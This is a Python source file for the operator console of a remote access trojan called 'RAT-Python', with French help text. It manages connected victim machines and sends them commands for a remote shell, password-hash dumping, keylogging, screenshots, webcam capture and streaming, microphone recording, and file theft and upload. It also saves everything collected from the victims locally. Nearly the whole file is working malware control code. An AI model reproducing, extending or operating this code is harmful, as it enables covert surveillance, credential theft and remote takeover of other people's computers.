import os
import base64
import time
import json

from src.utils.logger import setup_logger
from src.utils.protocol import OP_RESP, OP_ERROR, OP_FILE, OP_DATA, OP_STREAM, OP_STREAM_END, OP_CMD
from src.utils.config import SCREENSHOTS_DIR, FILES_DIR, AUDIO_DIR, WEBCAM_DIR
from src.utils.lib import send_msg
from src.utils.protocol import make_msg, parse_msg

log = setup_logger("cli")

HELP_GLOBAL = """
Commandes serveur :
  sessions          - liste les agents
  interact <id>     - interagir avec un agent
  help              - cette aide
  exit              - quitter
"""

HELP_AGENT = """
Commandes agent :
  help                  - aide
  shell <cmd>           - shell interactif
  ipconfig              - infos reseau
  screenshot            - capture ecran
  download <path>       - telecharge un fichier
  upload <local> <dest> - envoie un fichier
  search <nom>          - recherche un fichier
  hashdump              - dump hashes
  keylogger start/stop  - keylogger
  webcam_snapshot       - photo webcam
  webcam_stream         - stream webcam (CTRL+C stop)
  record_audio <sec>    - enregistre le micro
  back                  - retour menu principal
"""


def _ensure_dir(path):
    os.makedirs(path, exist_ok=True)


def _save_binary(data_b64, directory, filename):
    _ensure_dir(directory)
    dest = os.path.join(directory, filename)
    with open(dest, "wb") as f:
        f.write(base64.b64decode(data_b64))
    return dest


class CLI:
    def __init__(self, server):
        self.server = server

    def run(self):
        print("RAT-Python - tapez 'help' pour l'aide")
        while True:
            try:
                cmd = input("rat > ").strip()
            except (EOFError, KeyboardInterrupt):
                print("\n[*] Fermeture...")
                break

            if not cmd:
                continue

            if cmd == "exit":
                print("[*] Fermeture...")
                break
            elif cmd == "help":
                print(HELP_GLOBAL)
            elif cmd == "sessions":
                self._cmd_sessions()
            elif cmd.startswith("interact "):
                parts = cmd.split()
                if len(parts) < 2 or not parts[1].isdigit():
                    print("Usage: interact <id>")
                    continue
                self._interact(int(parts[1]))
            else:
                print(f"Commande inconnue: {cmd}")

    def _cmd_sessions(self):
        sessions = self.server.list_sessions()
        if not sessions:
            print("Aucun agent connecte.")
            return
        print(f"{'ID':<5} {'IP':<18} {'Hostname':<20} {'OS':<15} {'Connecte a'}")
        print("-" * 75)
        for s in sessions:
            print(f"{s.id:<5} {s.addr[0]:<18} {s.hostname:<20} {s.os_info:<15} {s.connected_at}")

    def _interact(self, agent_id):
        sess = self.server.get_session(agent_id)
        if not sess:
            print(f"Agent {agent_id} introuvable.")
            return

        print(f"[*] Interaction agent {agent_id} ({sess.hostname}). 'back' pour revenir.")

        while True:
            try:
                cmd = input(f"rat agent {agent_id} > ").strip()
            except (EOFError, KeyboardInterrupt):
                print()
                break

            if not cmd:
                continue
            if cmd == "back":
                break
            if cmd == "help":
                print(HELP_AGENT)
                continue

            try:
                self._dispatch_cmd(sess, cmd)
            except ConnectionError as e:
                log.error(f"Agent {agent_id} deconnecte: {e}")
                self.server.remove_session(agent_id)
                break
            except Exception as e:
                log.error(f"Erreur '{cmd}': {e}")

    def _dispatch_cmd(self, sess, cmd):
        parts = cmd.split()
        op = parts[0]

        if op == "download":
            self._handle_download(sess, cmd)
        elif op == "upload":
            self._handle_upload(sess, parts)
        elif op == "webcam_stream":
            self._handle_stream(sess, cmd)
        else:
            sess.send_cmd(cmd)
            resp = sess.recv_response()
            self._print_response(resp)

    def _print_response(self, resp):
        op = resp.get("op")
        if op in (OP_RESP, OP_ERROR):
            print(resp.get("payload", ""))
        elif op == OP_DATA:
            fname = resp.get("filename", f"data_{int(time.time())}.bin")
            ext = os.path.splitext(fname)[1].lower()
            if ext in (".png", ".jpg", ".jpeg"):
                dest = _save_binary(resp["data"], SCREENSHOTS_DIR, fname)
            elif ext in (".wav", ".mp3"):
                dest = _save_binary(resp["data"], AUDIO_DIR, fname)
            else:
                dest = _save_binary(resp["data"], FILES_DIR, fname)
            print(f"[+] Fichier sauvegarde : {dest}")
        elif op == OP_FILE:
            fname = resp.get("filename", f"file_{int(time.time())}.bin")
            dest = _save_binary(resp["data"], FILES_DIR, fname)
            print(f"[+] Fichier recu : {dest}")
        else:
            print(resp)

    def _handle_download(self, sess, cmd):
        sess.send_cmd(cmd)
        resp = sess.recv_response()
        self._print_response(resp)

    def _handle_upload(self, sess, parts):
        if len(parts) < 3:
            print("Usage: upload <chemin_local> <chemin_distant>")
            return
        local_path = parts[1]
        remote_path = parts[2]
        if not os.path.isfile(local_path):
            print(f"Fichier introuvable: {local_path}")
            return
        with open(local_path, "rb") as f:
            data = f.read()
        b64 = base64.b64encode(data).decode()
        fname = os.path.basename(local_path)
        full_cmd = f"upload {remote_path}"
        msg = json.dumps({
            "op": OP_CMD,
            "payload": full_cmd,
            "filename": fname,
            "data": b64,
        }).encode()
        send_msg(sess.sock, msg, sess.key)
        resp = sess.recv_response()
        self._print_response(resp)

    def _handle_stream(self, sess, cmd):
        sess.send_cmd(cmd)
        print("[*] Stream webcam demarre. CTRL+C pour arreter.")
        _ensure_dir(WEBCAM_DIR)
        frame_count = 0
        try:
            while True:
                resp = sess.recv_response()
                op = resp.get("op")

                if op == OP_STREAM_END:
                    if frame_count == 0:
                        print("[!] Stream termine sans frames")
                    else:
                        print(f"\n[*] Stream termine. {frame_count} frames dans {WEBCAM_DIR}")
                    break
                elif op == OP_ERROR:
                    print(f"[!] Erreur agent: {resp.get('payload', '?')}")
                    continue
                elif op == OP_STREAM:
                    frame_count += 1
                    fname = f"frame_{int(time.time() * 1000)}.jpg"
                    _save_binary(resp["data"], WEBCAM_DIR, fname)
                    if frame_count % 10 == 0:
                        print(f"  {frame_count} frames...", end="\r", flush=True)

        except KeyboardInterrupt:
            print()
            try:
                sess.send_cmd("webcam_stream_stop")
            except Exception:
                pass
            print(f"[*] Stream interrompu. {frame_count} frames dans {WEBCAM_DIR}")
